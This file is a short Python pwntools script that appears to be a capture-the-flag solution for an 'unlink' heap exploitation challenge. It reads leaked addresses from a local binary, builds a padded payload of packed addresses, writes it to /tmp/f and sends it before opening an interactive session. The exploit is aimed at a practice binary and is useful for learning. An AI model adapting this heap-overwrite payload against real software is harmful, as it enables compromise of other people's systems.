from pwn import * 



def getnum(byte):
    return int(re.findall(r"0x[0-9A-Fa-f]+",byte.decode())[0],16)


sh = process(b"./unlink")

# print(sh.recv(timeout=1).decode())
# sh.sendline(b"./unlink")

A_VAL = getnum(sh.recvline()) 
A_ADD = getnum(sh.recvline()) 
SHELL = 0x080491d6

print(A_ADD,A_VAL)
print(sh.recv().decode())


payload = cyclic(24) + p32(A_ADD) + p32(A_VAL) 



file = open("/tmp/f",mode="w")

os.write(file.fileno(),payload)
sh.sendline(payload)

sh.interactive()


